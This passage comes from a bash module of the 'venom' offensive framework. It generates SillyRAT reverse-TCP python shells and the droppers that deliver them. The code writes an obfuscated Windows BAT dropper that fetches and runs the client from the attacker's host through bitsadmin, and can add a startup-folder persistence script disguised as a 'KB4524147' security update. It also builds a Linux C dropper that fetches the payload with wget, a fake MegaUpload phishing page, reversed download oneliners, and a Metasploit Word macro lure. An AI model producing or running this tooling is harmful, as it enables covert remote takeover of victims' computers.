sh_multi_menu\n  clear\nfi\n}\n\n\n\n\n# ---------------------------------------------------\n# SillyRAT Multi-Platforms (reverse TCP python shell)\n# https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT\n# This Module works in categorie nº3 (exe dropper) or categorie nº8 (vbs dropper)\n# ---------------------------------------------------\nsh_shellcode27 () {\nColors;\n\n\nif [ \"$vbsevasion\" = \"ON\" ]; then\n## WARNING ABOUT SCANNING SAMPLES (VirusTotal)\necho \"---\"\necho \"${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)\"${Reset};\necho \"- Please Dont test samples on Virus Total or on similar\"${Reset};\necho \"- online scanners, because that will shorten the payload life.\"${Reset};\necho \"- And in testings also remmenber to stop the windows defender\"${Reset};\necho \"- from sending samples to \\$Microsoft.. (just in case).\"${Reset};\necho \"---\"\nsleep 2\nfi\n\n\n# ----------------- Dependencies Checks -----------------\n\n\n## Make Sure all dependencies are meet (attacker)\n# Check if mingw32 OR mingw-W64 GCC library exists\necho \"${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}\";sleep 2\naudit=$(which $ComP) > /dev/null 2>&1\nif [ \"$?\" -ne \"0\" ]; then\n   echo \"${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}\"\n   echo \"${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler.\"\n   if [ \"$ArCh\" = \"x64\" ]; then\n      echo \"\" && sudo apt-get update -qq && apt-get install -y mingw-w64 && echo \"\"\n      ComP=\"i686-w64-mingw32-gcc\" # GCC library used to compile binary\n   else\n      echo \"\" && sudo apt-get update -qq && apt-get install -y mingw32 && echo \"\"\n      ComP=\"i586-mingw32msvc-gcc\" # GCC library used to compile binary\n   fi\nfi\n\n## Check if python3 its installed on attacker machine\naudit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1\nif [ \"$?\" -ne \"0\" ]; then\n   echo \"${RedF}[ERROR] python3 interpreter not found${white}\";sleep 2\n   echo \"${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}\";\n   echo \"${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.\";sleep 2\n   echo \"\" && sudo apt-get update -qq && apt-get install -y python python3 && echo \"\"\nfi\n\n## Check if 'venomconf' local file exists\nif ! [ -e \"$IPATH/bin/SillyRAT/venomconf\" ]; then\n   cd $IPATH/bin/SillyRAT\n   echo \"${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.\";sleep 2\n   echo \"\" && sudo pip3 install -r requirements.txt && echo \"\"\n   ## Write 'venomconf' file to prevent the install function from running again\n   echo \"venom 'SillyRAT' configuration file\" > venomconf\n   cd $IPATH\nfi\n\n\n# -------------------------------------------------------\n\n\n## Store User Inputs (module bash variable declarations)..\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nDrop=$(zenity --title=\"☠ Enter AGENT|DROPPER FILENAME ☠\" --text \"example: Procmom\\nWarning: Allways Start FileNames With 'Capital Letters'\" --entry --width 300) > /dev/null 2>&1\nSOSP=$(zenity --list --title \"☠ Target Operative system sellection ☠\" --text \"Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\\nWithout the dropper the Client.py requires to be manual executed\\nand it will no longer auto-install SillyRAT python3 dependencies.\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"Windows\" FALSE \"Linux\" FALSE \"Mac\" --height 240) > /dev/null 2>&1\nif [ \"$SOSP\" = \"Windows\" ]; then rpath=$(zenity --title=\"☠ Enter Files Upload Path (target dir) ☠\" --text \"example: %tmp% (*)\\nexample: %LocalAppData%\\n(*) Recomended Path For Upload our files.\\nRemark: Only CMD environment var's accepted\" --entry --width 350) > /dev/null 2>&1;fi\n\nId=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)\neaster_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)\n## Setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"666\";fi\nif [ -z \"$rpath\" ]; then rpath=\"%tmp%\";fi\nif [ -z \"$SOSP\" ]; then SOSP=\"windows\";fi\nif [ -z \"$Drop\" ]; then Drop=\"Procmom\";fi\nwvd=$(echo $rpath|sed \"s|^[%]|\\$env:|\"|sed \"s|%||\")\nif [ \"$SOSP\" = \"Windows\" ]; then\n   targetos=\"$SOSP\"\n   uploadpath=\"$rpath => ($wvd)\"\n   if [ \"$easter_egg\" = \"ON\" ] || [ \"$vbsevasion\" = \"ON\" ]; then\n      lolbin=\"bitsadmin (DownloadFile)\"\n      dropperpath=\"$IPATH/output/$Drop.bat\"\n   else\n      lolbin=\"Powershell (DownloadFile)\"\n      dropperpath=\"$IPATH/output/$Drop.exe\"\n   fi\nelif [ \"$SOSP\" = \"Linux\" ]; then\n   targetos=\"$SOSP\"\n   uploadpath=\"/tmp => (remote)\"\n   lolbin=\"wget (DownloadFile)\"\n   dropperpath=\"$IPATH/output/$Drop\"\nelse # Mac or multi-platforms\n   lolbin=\"http => MegaUpload.html\"\n   targetos=\"Multi-Platforms\"\n   uploadpath=\"NULL => Client.py manual execution\"\n   dropperpath=\"NULL => Client.py manual execution\"\nfi\n\n\n## Display final settings to user.\nif [ \"$vbsevasion\" = \"ON\" ]; then echo \"${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS\"${Reset};sleep 2;fi\necho ${BlueF}\"---\"\ncat << !\n    LPORT    : $lport\n    LHOST    : $lhost\n    TARGETOS : $targetos distros\n    LOLBin   : $lolbin\n    DROPPER  : $dropperpath\n    AGENT    : $IPATH/output/$Drop.py\n    UPLOADTO : $uploadpath\n!\necho \"---\"\n\n\ncd $IPATH/output\nif [ \"$SOSP\" = \"Windows\" ]; then\n\n   ## BUILD DROPPER (Install python3/Download/Execute Client.py)\n   # Remark: Its mandatory the install of python3/pip3 SillyRAT rat\n   # requirements in target system before executing the Client.py remote.\n   if [ \"$easter_egg\" = \"ON\" ] || [ \"$vbsevasion\" = \"ON\" ]; then\n      ## Build dropper.bat (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)\n      echo \"${BlueF}[☠]${white} Creating dropper BAT Program.\"${Reset};sleep 2\n      echo \":: Framework: Venom v1.0.17 - shinigami\" > $Drop.bat\n      echo \":: Author: r00t-3xp10it (SSA RedTeam @2020)\" >> $Drop.bat\n      echo \"@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \\$\\$=-w 1&&set \\$i=py&&set #?=.\" >> $Drop.bat\n      echo \"@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \\\"\\\" /mi%@$%n \\\"%~dpnx0\\\" %* &%i@_%& eX%@$%I%_i_%t\" >> $Drop.bat\n      echo \"@p\\\"O\\\"%i%we^R%@%s\\\"h\\\"^e%db%ll \\$C=p\\\"i\\\"%@%p sh%@%o^w t\\\"a\\\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\\$C)){p%@%i^p i\\\"n\\\"s%@%t^a%@%ll t\\\"a\\\"b%@%u^la%@%te py%@%n^pu%@%t p\\\"s\\\"u%@%t^i%@%l pi%@%l^l%@%o\\\"w\\\" pys%@%cr^ee%@%ns%@%h^ot p\\\"y\\\"i%@%ns^t%@%a\\\"l\\\"l%@%e^r}\" >> $Drop.bat\n      echo \"@Po%@i%w\\\"E\\\"r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\\\"\\\"\\\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\\\"\\\"\\\",4,\\\"\\\"\\\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\\\"\\\"\\\",0+64)\" >> $Drop.bat\n      echo \"@pOw^e%@%rS^h\\\"E\\\"%@_%lL %\\$\\$% bi%@$%t^s\\\"a\\\"%@i%d^m%@f%in %i()%/t^ra%@i%n\\\"s\\\"%@$%f^er pu%@%r^pl%@%e\\\"t\\\"e%@%a^m /do%@_%w^n%@i%l\\\"o\\\"%@#1%ad %(f$)%/p^ri%@$%or\\\"i\\\"%@i%ty fo%@$%r\\\"e\\\"g%@'%ro^u%@$%nd %-%ht%@%tp:/%@%/$lhost/$Drop.%\\$i% $wvd\\\\$Drop.%\\$i%\" >> $Drop.bat\n      echo \"${BlueF}[☠]${white} Written $Drop.bat to output (obfuscated)\"${Reset};sleep 2\n\n      ## Persistence script execution (minimized terminal prompt) using BATCH script.\n      wvd=$(echo $rpath|sed \"s|^[%]|\\$env:|\"|sed \"s|%||\")\n      persistence=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Do you wish to add persistence to dropper.bat ?\\n\\ndropper.bat will create KB4524147.update.bat on remote startup folder that\\nruns '$Drop.py' with 8 sec of interval at startup until a valid connection its found.\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"Dont Add Persistence\" FALSE \"Add persistence\") > /dev/null 2>&1\n      if [ \"$persistence\" = \"Add persistence\" ]; then\n         echo \"echo @echo off > \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \\\"\\\" /min \\\"%%~dpnx0\\\" %%* ^&^& exit >> \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"echo title Cumulative Security Update KB4524147 >> \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"echo echo Please wait, Updating system .. >> \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"echo Powershell -w 1 cd $wvd;python $Drop.py >> \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"echo exit >> \\\"%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\KB4524147.update.bat\\\"\" >> $Drop.bat\n         echo \"${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}\";sleep 2\n      fi\n      echo \"@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\\\"N\\\" $Drop.%\\$i%\" >> $Drop.bat\n      echo \"=Exit\" >> $Drop.bat\n\n   else\n\n      ## Build dropper.exe [flagged by AV] (default in categorie nº3 - Agent nº5)\n      echo \"${BlueF}[☠]${white} Creating dropper C Program.\"${Reset};sleep 2\n      cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c\n      sed -i \"s|LhOsT|$lhost|g\" dropper.c\n      sed -i \"s|LpOrT|$lport|g\" dropper.c\n      sed -i \"s|FiLNaMe|$Drop|g\" dropper.c\n      sed -i \"s|TempDir|$rpath|g\" dropper.c\n\n      ## COMPILING C Program USING mingw32 OR mingw-W64 (attacker sellection)\n      echo \"${BlueF}[☠]${white} Compiling dropper using GCC mingw\"${Reset};sleep 2\n      # Special thanks to astr0baby for mingw32 -mwindows switch :D\n      $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows\n      rm $IPATH/output/dropper.c > /dev/nul 2>&1\n   fi\n\nelif [ \"$SOSP\" = \"Linux\" ]; then\n\n      ## Set Agent (Client.py) execution delay time in seconds (default 40)\n      delayTime=$(zenity --title=\"☠ Enter Agent/Client execution delay time (sec) ☠\" --text \"example: 40\\nThis delay time its required for the dropper to have time to finish\\ninstall python3 dependencies before running the Client.py in background.\\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth).\" --entry) > /dev/null 2>&1\n      if [ -z \"$delayTime\" ]; then delayTime=\"40\";fi\n\n      ## BUILD DROPPER (Install python3/Download/Execute Client.py)\n      echo \"${BlueF}[☠]${white} Creating dropper C Program.\"${Reset};sleep 1\n      echo \"${BlueF}[☠]${white} Client.py delayTime: $delayTime (sec)\"${Reset};sleep 2\n      echo \"#include<stdio.h>\" > $Drop.c\n      echo \"#include<stdlib.h>\" >> $Drop.c\n      echo \"#include<string.h>\" >> $Drop.c\n      echo \"#include<sys/types.h>\" >> $Drop.c\n      echo \"#include<sys/wait.h>\" >> $Drop.c\n      echo \"#include<unistd.h>\" >> $Drop.c\n      echo \"\" >> $Drop.c\n      echo \"/*\" >> $Drop.c\n      echo \"Author: r00t-3xp10it (SSA RedTeam @2020)\" >> $Drop.c\n      if [ \"$vbsevasion\" = \"ON\" ]; then\n         echo \"Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6\" >> $Drop.c\n      else\n         echo \"Framework: Venom v1.0.17 - Multi-OS - Agent nº5\" >> $Drop.c\n      fi\n      echo \"Function: Install python3 SillyRAT requirements before downloading and executing\" >> $Drop.c\n      echo \"$Drop.py (Client reverse tcp python shell) detach from parent (dropper) process.\" >> $Drop.c\n      echo \"Mandatory dependencies: python3 and pip3 {tabulate pynput psutil pillow pyscreenshot pyinstaller}\" >> $Drop.c\n      echo \"*/\" >> $Drop.c\n      echo \"\" >> $Drop.c\n      echo \"int main()\" >> $Drop.c\n      echo \"{\" >> $Drop.c\n      echo \"   /*\" >> $Drop.c\n      echo \"   This fork(); function allow us to spawn a new child process (in background). This way i can\" >> $Drop.c\n      echo \"   execute Client.py in background while continue the execution of the C program in foreground.\" >> $Drop.c\n      echo \"   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c\" >> $Drop.c\n      echo \"   */\" >> $Drop.c\n      echo \"   fflush(NULL);\" >> $Drop.c\n      echo \"   int pid = fork();\" >> $Drop.c\n      echo \"      if (pid > 0) {\" >> $Drop.c\n      echo \"         /*\" >> $Drop.c\n      echo \"         We are runing in parent process (child its also running)\" >> $Drop.c\n      echo \"         Function: Install python3 and sillyrat requirements\" >> $Drop.c\n      echo \"         */\" >> $Drop.c\n      echo \"         printf(\\\"\\\\\\n$Drop - 3.10.5-dev Linux Installer\\\\\\n\\\");\" >> $Drop.c\n      echo \"         printf(\\\"----------------------------------------------------\\\\\\n\\\");\" >> $Drop.c\n      echo \"         /* Display system information onscreen to target user */\" >> $Drop.c\n      echo \"         sleep(1);system(\\\"c=\\$(hostnamectl);echo \\\\\\\"\\$c\\\\\\\"\\\");\" >> $Drop.c\n      echo \"         printf(\\\"----------------------------------------------------\\\\\\n\\\");\" >> $Drop.c\n      echo \"\" >> $Drop.c\n      echo \"            /* Install python3 and SillyRAT requirements if not found */\" >> $Drop.c\n      echo \"            sleep(1);system(\\\"sudo apt-get update;apt-get install -y python3;pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\\\");\" >> $Drop.c\n      echo \"            printf(\\\"Done.. ALL $Drop requirements are satisfied.\\\\\\n\\\");\" >> $Drop.c\n      echo \"\" >> $Drop.c\n      echo \"      }\" >> $Drop.c\n      echo \"      else if (pid == 0) {\" >> $Drop.c\n      echo \"         /*\" >> $Drop.c\n      echo \"         We are running in child process (as backgrond job - orphan).\" >> $Drop.c\n      echo \"         setsid(); allow us to detach the child (Client) from parent (dropper) process,\" >> $Drop.c\n      echo \"         allowing us to continue running the Client.py in ram even if parent process its terminated.\" >> $Drop.c\n      echo \"         */\" >> $Drop.c\n      echo \"         setsid();\" >> $Drop.c\n      echo \"         sleep($delayTime);system(\\\"cd /tmp && sudo /usr/bin/wget -qq http://$lhost/$Drop.py -O /tmp/$Drop.py && python3 $Drop.py\\\");\" >> $Drop.c\n      echo \"      } return 0;\" >> $Drop.c\n      echo \"}\" >> $Drop.c\n\n      ## COMPILING C Program USING GCC execstack\n      echo \"${BlueF}[☠]${white} Compiling dropper using GCC execstack\"${Reset};sleep 2\n      gcc -fno-stack-protector -z execstack $Drop.c -o $Drop\n      chmod +x $IPATH/output/$Drop > /dev/null 2>&1\n      # rm $IPATH/output/$Drop.c > /dev/nul 2>&1\n\nelse\n: ## If 'Cancel' OR 'Mac' options sellected => Client.py its deliver insted of dropper.(exe|vbs)\nfi\n\n\ncd $IPATH/bin/SillyRAT\n## Writting Client reverse tcp python shell to output\necho \"${BlueF}[☠]${white} Writting Client reverse tcp shell to output.\"${Reset};sleep 2\ngnome-terminal --title=\"SillyRAT - Generator Mode\" --geometry=90x21 --wait -- sh -c \"python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2\" > /dev/null 2>&1\n\n\ncd $IPATH/output\n## OBFUSCATION: Make sure emojify obfuscator its installed\n# Author: @chris-rands (https://github.com/chris-rands/emojify)\nif [ \"$SOSP\" = \"Windows\" ]; then\n   if [ \"$easter_egg\" = \"ON\" ] || [ \"$vbsevasion\" = \"ON\" ]; then\n      echo \"${BlueF}[☠]${white} Obfuscate Client.py rev tcp shell (emojify)\"${Reset};sleep 2\n      audit=$(pip3 show emojify) > /dev/null 2>&1\n      if [ \"$?\" -ne \"0\" ]; then\n         echo \"${RedF}[ERROR] emojify obfuscator not found.${white}\";sleep 2\n         echo \"${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify obfuscator.\"${Reset};\n         echo \"\" && sudo apt-get update && pip3 install emojify && echo \"\"\n      fi\n      ## Obfuscate Client.py sourcecode using emojify\n      emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1\n      mv obfuscated.py $Drop.py > /dev/nul 2>&1\n      echo \"${BlueF}[${YellowF}i${BlueF}]${white} $Drop.py successfully obfuscated.\"${Reset};sleep 2\n   fi\nfi\n\n\ncd $IPATH/templates/phishing\n## Building 'the Download Webpage' in HTML\necho \"${BlueF}[☠]${white} Building HTML Download WebPage (apache2)\"${Reset};sleep 2\nsed \"s|NaM3|http://$lhost/$Drop.zip|g\" mega.html > MegaUpload.html\nmv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1\n\ncd $IPATH/output\necho \"${BlueF}[☠]${white} Porting required files to apache2 webroot.\"${Reset};sleep 2\nif [ \"$SOSP\" = \"Windows\" ]; then\n\n   if [ \"$easter_egg\" = \"ON\" ] || [ \"$vbsevasion\" = \"ON\" ]; then\n      zip $Drop.zip $Drop.bat > /dev/nul 2>&1 # ZIP dropper.bat\n      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell\n      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped\n   else\n      zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe\n      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell\n      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped\n   fi\n\nelif [ \"$SOSP\" = \"Linux\" ]; then\n   zip $Drop.zip $Drop > /dev/nul 2>&1 # ZIP dropper.c\n   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell\n   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped\nelse # Mac or multi-platforms\n   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell\n   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped\nfi\n\n\ncd $IPATH\n## Print attack vector on terminal\necho \"${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..\";sleep 2\necho \"${BlueF}---\";\necho \"${BlueF}- ${RedBg}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${Reset}\"\necho \"${BlueF}- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html\"\nif [ \"$SOSP\" = \"Linux\" ]; then\n   ## Build 'onelinner' download/execute dropper (obfuscated)\n   original_string=\"sudo /usr/bin/wget -qq http://$lhost/$Drop.zip;unzip $Drop.zip;./$Drop\"\n   ## Reverse original string (venom attack vector)\n   xterm -T \" Reversing Original String (oneliner)\" -geometry 110x23 -e \"rev <<< \\\"$original_string\\\" > /tmp/reverse.txt\"\n   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt\n   ## Display onelinner(s) option(s) to attacker.\n   echo \"-\";echo \"- ${YellowF}ONELINER:\"${BlueF};\n   echo \"- $original_string\";echo \"-\"\n   echo \"- ${YellowF}ONELINER_OBFUSCATED:\"${BlueF};\n   echo \"- rev <<< \\\"$reverse_original\\\"|\\$0\"\nfi\necho \"${BlueF}---\"${Reset};\necho -n \"${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler.\"\nread stupidpause\n\n\ncd $IPATH/output\n## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER\ncp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1\necho \"\" && python3 server.py bind --address 0.0.0.0 --port $lport\ncd $IPATH\nsleep 2\n\n\n## Clean old files.\necho \"${BlueF}[☠]${white} Please Wait, cleaning old files.${white}\";sleep 2\nrm $ApAcHe/$Drop.py > /dev/nul 2>&1\nrm $ApAcHe/$Drop.zip > /dev/nul 2>&1\nrm $IPATH/output/$Drop > /dev/nul 2>&1\nrm $IPATH/output/$Drop.c > /dev/nul 2>&1\nrm $IPATH/output/$Drop.py > /dev/nul 2>&1\nrm $ApAcHe/Download.html > /dev/nul 2>&1\nrm $IPATH/output/dropper.c > /dev/nul 2>&1\nrm $ApAcHe/MegaUpload.html > /dev/nul 2>&1\nrm $ApAcHe/webserver.ps1 > /dev/nul 2>&1\nrm $IPATH/output/Obfuscated.bat > /dev/nul 2>&1\nrm $IPATH/output/vbs-obfuscator.py > /dev/nul 2>&1\nrm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1\n\n\ncd $IPATH/output\n## Persistence handler script (zip) creation ..\nif [ \"$persistence\" = \"Add persistence\" ]; then\n\n   dtr=$(date|awk {'print $2,$3,$4,$5'})\n   cp $IPATH/bin/handlers/handler3.sh $IPATH/output/handler.sh\n   ## Config handler script variable declarations ..\n   two=$(cat handler.sh | egrep -m 1 \"ID\") > /dev/null 2>&1\n   sed -i \"s|$two|ID='$Id'|\" handler.sh\n   tree=$(cat handler.sh | egrep -m 1 \"CLIENT\") > /dev/null 2>&1\n   sed -i \"s|$tree|CLIENT='$Drop.py'|\" handler.sh\n   four=$(cat handler.sh | egrep -m 1 \"LPORT\") > /dev/null 2>&1\n   sed -i \"s|$four|LPORT='$lport'|\" handler.sh\n   five=$(cat handler.sh | egrep -m 1 \"LHOST\") > /dev/null 2>&1\n   sed -i \"s|$five|LHOST='$lhost'|\" handler.sh\n   seven=$(cat handler.sh | egrep -m 1 \"RPATH\") > /dev/null 2>&1\n   sed -i \"s|$seven|RPATH='$rpath\\\\\\\\$Drop.py'|\" handler.sh\n   oito=$(cat handler.sh | egrep -m 1 \"FIRST_ACCESS\") > /dev/null 2>&1\n   sed -i \"s|$oito|FIRST_ACCESS='$dtr'|\" handler.sh\n   nove=$(cat handler.sh | egrep -m 1 \"DROPPER\") > /dev/null 2>&1\n   sed -i \"s|$nove|DROPPER='$Drop.bat'|\" handler.sh\n\n\n   ## Write README file (to be compressed)\n   echo \"Id          : $Id\" > README\n   echo \"Description : Reverse TCP python Shell (SillyRAT)\" >> README\n   echo \"Categorie   : Amsi Evasion (agent nº6)\" >> README\n   echo \"Active On   : $dtr\" >> README\n   echo \"Lhost|Lport : $lhost:$lport\" >> README\n   echo \"\" >> README\n   echo \"Instructions\" >> README\n   echo \"------------\" >> README\n   echo \"1 - cd output\" >> README\n   echo \"2 - unzip handler_ID:$Id.zip\" >> README\n   echo \"3 - sh handler.sh\" >> README\n   echo \"\" >> README\n   echo \"Detail Description\" >> README\n   echo \"------------------\" >> README\n   echo \"If sellected 'add persistence' to dropper in venom amsi evasion\" >> README\n   echo \"agent nº6 build. Them the dropper when executed it will create in\" >> README\n   echo \"remote target startup folder a script named 'KB4524147.update.bat'\" >> README\n   echo \"that beacons home from 8 to 8 sec until a valid tcp connection is found\" >> README\n   echo \"and creates this handler file (zip) to store attacker handler settings.\" >> README\n\n\n   ## zip handler files\n   echo \"${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files ..\"${Reset};sleep 2\n   zip handler_ID:$Id.zip handler.sh server.py README -m -q\n   cd $IPATH\n   zenity --title=\"☠ Reverse TCP python Shell (SillyRAT) ☠\" --text \"Persistence handler files stored under:\\n$IPATH/output/handler_ID:$Id.zip\" --info --width 340 --height 130 > /dev/null 2>&1\nfi\n\ncd $IPATH\nvbsevasion=\"OFF\"\nsh_menu\n}\n\n\n\n\n\n# ---------------------------------------------------\n# astrobaby word macro trojan payload (windows.c) OR\n# exploit/multi/fileformat/office_word_macro (python)\n# ---------------------------------------------------\nsh_world23 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: astrobaby\" --width 300) > /dev/null 2>&1\nTarg=$(zenity --list --title \"☠ CHOSE TARGET SYSTEM ☠\" --text \"chose target system ..\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"WINDOWS\" FALSE \"MAC OS x\" --width 305 --height 100) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"astrobaby\";fi\nif [ -z \"$Targ\" ]; then Targ=\"WINDOWS\";fi\n\n  # config rigth arch (payload+format)\n  if [ \"$Targ\" = \"WINDOWS\" ]; then\n    taa=\"0\"\n    orm=\"C\"\n    paa=\"windows/meterpreter/reverse_tcp\"\n  else\n    taa=\"1\"\n    orm=\"PYTHON\"\n    paa=\"python/meterpreter/reverse_tcp\"\n  fi\n\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : $orm -> $Targ\n    PAYLOAD : $paa\n    AGENT   : $IPATH/output/$N4m.docm\n\n!\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $IPATH/templates/astrobaby.c ]; then\n      echo \"[☠] astrobaby.c -> found!\"\n      sleep 2\n   else\n      echo \"[☠] astrobaby.c -> not found!\"\n      exit\n   fi\n\n   # check if mingw32 exists\n   audit=`which $ComP`> /dev/null 2>&1\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"[☠] mingw32 compiler -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] mingw32 compiler -> not found!\"\n      echo \"[☠] Download compiler -> apt-get install mingw32\"\n      echo \"\"\n      sudo apt-get install mingw32\n      echo \"\"\n      fi\n\n\n# building template (windows systems)\nif [ \"$Targ\" = \"WINDOWS\" ]; then\necho \"[☠] editing/backup files ..\"\ncp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1\ncd $IPATH/templates\nsed -i \"s|LhOsT|$lhost|g\" astrobaby.c\nsed -i \"s|lPoRt|$lport|g\" astrobaby.c\n# obfuscation ??\nUUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)\nsed -i \"s|UUID-RANDOM|$UUID_1|g\" astrobaby.c\nsleep 2\n\n# compiling template (windows systems)\necho \"[☠] Compiling using mingw32 ..\"\nsleep 2\n# i686-w64-mingw32-gcc astr0baby.c -o payload.exe -lws2_32 -mwindows\n$ComP astrobaby.c -o payload.exe -lws2_32 -mwindows\nstrip payload.exe > /dev/null 2>&1\nmv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1\necho \"[☠] Binary: $IPATH/output/$N4m.exe ..\"\ncd $IPATH\nsleep 2\nfi\n\n\n\n# use metasploit to build shellcode\necho \"[☠] Generating MS_word document ..\"\nsleep 2\nif [ \"$Targ\" = \"WINDOWS\" ]; then\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'\" > /dev/null 2>&1\nelse\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'\" > /dev/null 2>&1\nfi\n\nmv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1\necho \"[☠] MS_word agent: $IPATH/output/$N4m.docm ..\"\nsleep 